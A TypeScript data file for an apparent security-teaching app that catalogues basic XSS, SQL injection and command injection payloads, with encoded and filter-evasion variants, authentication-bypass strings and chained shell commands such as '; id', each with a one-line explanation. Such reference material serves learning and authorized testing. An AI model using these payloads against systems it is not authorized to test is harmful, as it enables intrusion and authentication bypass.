/**
 * Payload reference data.
 *
 * These are the canonical, basic teaching examples used in security courses
 * (OWASP, PortSwigger Web Security Academy, and similar). They exist to help a
 * learner recognize a vulnerability class and test for it on systems they own
 * or are authorized to test. They are reference strings, not automation, and
 * the command injection samples use harmless demonstrator commands only
 * (id, whoami, sleep), never anything destructive.
 *
 * Each entry has a stable `id`. Deeper explanations live in lib/explain.ts and
 * join to a payload by that id, so content stays decoupled from this data.
 *
 * To extend this module, just add entries to the array below. The component
 * and its filters read straight from here.
 */

export type PayloadCategory = "XSS" | "SQL Injection" | "Command Injection";

// Where the payload is typically injected. Shown as a badge and used as a
// filter. One context per payload keeps the data and the badge simple.
export type PayloadContext =
  | "URL parameter"
  | "Form field"
  | "HTTP header"
  | "Request body"
  | "Cookie";

export type Payload = {
  id: string; // stable key, used to join explanations
  category: PayloadCategory;
  context: PayloadContext; // the usual injection point for this example
  value: string; // the reference string itself
  explanation: string; // one line on what it demonstrates and why it matters
  tags: string[]; // cross cutting labels for filtering
};

export const payloadCategories: PayloadCategory[] = [
  "XSS",
  "SQL Injection",
  "Command Injection",
];

// Fixed order for the context filter row.
export const payloadContexts: PayloadContext[] = [
  "URL parameter",
  "Form field",
  "HTTP header",
  "Request body",
  "Cookie",
];

export const payloads: Payload[] = [
  /* ----------------------------- XSS ----------------------------- */
  {
    id: "xss-script-basic",
    category: "XSS",
    context: "URL parameter",
    value: "<script>alert(1)</script>",
    explanation:
      "The classic reflected test. If it runs, output is not being escaped.",
    tags: ["basic"],
  },
  {
    id: "xss-img-onerror",
    category: "XSS",
    context: "Form field",
    value: "<img src=x onerror=alert(1)>",
    explanation:
      "Uses an event handler, so it fires even when script tags are stripped.",
    tags: ["basic", "event-handler"],
  },
  {
    id: "xss-svg-onload",
    category: "XSS",
    context: "Cookie",
    value: "<svg onload=alert(1)>",
    explanation:
      "An SVG element that runs on load. Handy where a cookie value is reflected.",
    tags: ["basic", "event-handler"],
  },
  {
    id: "xss-url-encoded",
    category: "XSS",
    context: "URL parameter",
    value: "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    explanation:
      "URL encoded angle brackets, to test filters that decode before rendering.",
    tags: ["encoded", "url"],
  },
  {
    id: "xss-html-entity",
    category: "XSS",
    context: "Form field",
    value: "&#60;script&#62;alert(1)&#60;/script&#62;",
    explanation:
      "HTML entity encoded. Checks whether entities are decoded back into markup.",
    tags: ["encoded", "html-entity"],
  },
  {
    id: "xss-unicode-escape",
    category: "XSS",
    context: "Request body",
    value: "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
    explanation:
      "Unicode escapes for a JSON or JavaScript string context that unescapes input.",
    tags: ["encoded", "unicode"],
  },
  {
    id: "xss-mixed-case",
    category: "XSS",
    context: "URL parameter",
    value: "<sCrIpT>alert(1)</sCrIpT>",
    explanation:
      "Mixed case to slip past a case sensitive blocklist of the word script.",
    tags: ["obfuscated", "case"],
  },
  {
    id: "xss-fromcharcode",
    category: "XSS",
    context: "URL parameter",
    value: "<script>alert(String.fromCharCode(88,83,83))</script>",
    explanation:
      "Builds the string from char codes to avoid a literal keyword being flagged.",
    tags: ["obfuscated"],
  },
  {
    id: "xss-var-split",
    category: "XSS",
    context: "Form field",
    value: "<img src=x onerror=\"a=alert;a(1)\">",
    explanation:
      "Splits the call through a variable to dodge simple pattern matches.",
    tags: ["obfuscated", "event-handler"],
  },

  /* ------------------------ SQL Injection ------------------------ */
  {
    id: "sqli-single-quote",
    category: "SQL Injection",
    context: "Form field",
    value: "'",
    explanation:
      "A lone quote. The simplest probe: a database error hints at injection.",
    tags: ["basic", "error-based"],
  },
  {
    id: "sqli-or-1-1",
    category: "SQL Injection",
    context: "Form field",
    value: "' OR '1'='1",
    explanation:
      "An always true condition, the textbook authentication bypass demo.",
    tags: ["basic", "auth-bypass"],
  },
  {
    id: "sqli-or-comment",
    category: "SQL Injection",
    context: "URL parameter",
    value: "' OR 1=1 -- ",
    explanation:
      "Comments out the rest of the query so only the true condition remains.",
    tags: ["basic", "auth-bypass", "comment"],
  },
  {
    id: "sqli-admin-comment",
    category: "SQL Injection",
    context: "Form field",
    value: "admin' -- ",
    explanation:
      "Targets a login by ending the username and commenting out the password check.",
    tags: ["basic", "auth-bypass", "comment"],
  },
  {
    id: "sqli-double-quote",
    category: "SQL Injection",
    context: "Form field",
    value: "\" OR \"1\"=\"1",
    explanation:
      "The double quote variant, for inputs wrapped in double quotes.",
    tags: ["basic", "auth-bypass"],
  },
  {
    id: "sqli-union-null",
    category: "SQL Injection",
    context: "URL parameter",
    value: "' UNION SELECT NULL-- ",
    explanation:
      "Introduces UNION to learn the column count, the first step in extraction.",
    tags: ["union"],
  },
  {
    id: "sqli-time-sleep",
    category: "SQL Injection",
    context: "HTTP header",
    value: "' OR SLEEP(5)-- ",
    explanation:
      "A time delay (MySQL) via a header like User-Agent. A slow response signals blind injection.",
    tags: ["time-based", "blind", "mysql"],
  },

  /* ---------------------- Command Injection ---------------------- */
  {
    id: "cmd-semicolon-id",
    category: "Command Injection",
    context: "HTTP header",
    value: "; id",
    explanation:
      "Chains a harmless command after a semicolon. id just prints the user.",
    tags: ["basic", "unix", "chaining"],
  },
  {
    id: "cmd-and-whoami",
    category: "Command Injection",
    context: "Form field",
    value: "&& whoami",
    explanation:
      "Runs whoami only if the first command succeeds. A benign confirmation.",
    tags: ["basic", "unix", "chaining"],
  },
  {
    id: "cmd-pipe-whoami",
    category: "Command Injection",
    context: "URL parameter",
    value: "| whoami",
    explanation:
      "Pipes into a second command. Tests whether pipe characters pass through.",
    tags: ["basic", "unix", "pipe"],
  },
  {
    id: "cmd-subshell",
    category: "Command Injection",
    context: "Request body",
    value: "$(id)",
    explanation:
      "Command substitution. If id runs, unsanitized input reaches a shell.",
    tags: ["substitution", "unix"],
  },
  {
    id: "cmd-backtick",
    category: "Command Injection",
    context: "Request body",
    value: "`id`",
    explanation:
      "Backtick substitution, the older form of the same idea.",
    tags: ["substitution", "unix"],
  },
  {
    id: "cmd-sleep",
    category: "Command Injection",
    context: "URL parameter",
    value: "; sleep 5",
    explanation:
      "A benign delay for blind detection when there is no visible output.",
    tags: ["time-based", "blind", "unix"],
  },
  {
    id: "cmd-win-amp",
    category: "Command Injection",
    context: "URL parameter",
    value: "& whoami",
    explanation:
      "The Windows chaining separator, for cmd.exe style targets.",
    tags: ["basic", "windows", "chaining"],
  },
];

/** Every distinct tag, sorted, for the filter bar. */
export function allTags(): string[] {
  return [...new Set(payloads.flatMap((p) => p.tags))].sort();
}
